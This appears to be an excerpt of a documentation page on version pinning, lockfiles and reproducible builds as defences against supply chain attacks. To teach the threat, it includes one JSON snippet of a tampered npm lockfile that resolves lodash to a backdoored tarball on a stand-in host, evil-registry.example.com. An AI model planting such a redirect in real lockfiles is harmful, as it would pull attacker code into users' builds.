---
title: "Version Pinning, Lockfiles, and Reproducible Builds"
description: "Implement version control strategies from basic pinning to reproducible builds—ensuring what you test is what you deploy."
icon: "lucide/pin"
---
...
!!! danger "The Version Range Dilemma"

    **Too strict** (all exact versions): Security patches don't flow automatically—you must manually update everything. **Too loose** (all ranges): Supply chain attacks flow automatically into your build.
...
!!! info "Lockfiles Are Foundation, Not Complete Solution"

    Lockfiles provide reproducibility and integrity verification, but depend on broader security context: reviewed changes, trusted registries, provenance attestations, and CI verification gates.
...
// Malicious lockfile modification
{
  "packages": {
    "node_modules/lodash": {
      "version": "4.17.21",
      "resolved": "https://evil-registry.example.com/lodash-backdoor.tgz",
...
- Debian: active reproducibility tracking for multiple suites and architectures, including [AMD64][debian-reproducible]
...
# Use trimpath to remove local filesystem paths from output
